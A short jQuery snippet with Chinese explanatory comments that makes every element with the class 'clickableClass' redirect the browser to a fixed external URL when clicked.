$(function () {
	// 设置跳转路径
	var url = "https://wechanesia.top/"; //如果是外部链接 ' ' 中则全部替换为完整网址链接 如：'https://www.example.com'

	// 使用querySelectorAll获取所有具有特定类名的元素
	var clickableElements = document.querySelectorAll(".clickableClass"); // 假设class是clickableClass

	// 遍历这些元素并为它们添加点击事件监听器
	clickableElements.forEach(function (element) {
		element.addEventListener("click", function (event) {
			// 如果元素是<a>标签或其他有默认行为的元素，你可能需要阻止默认行为
			// 但如果它是<div>或其他没有默认行为的元素，你可以注释掉或删除这行代码
			event.preventDefault();

			// 执行跳转
			window.location.href = url;
		});
	});
});
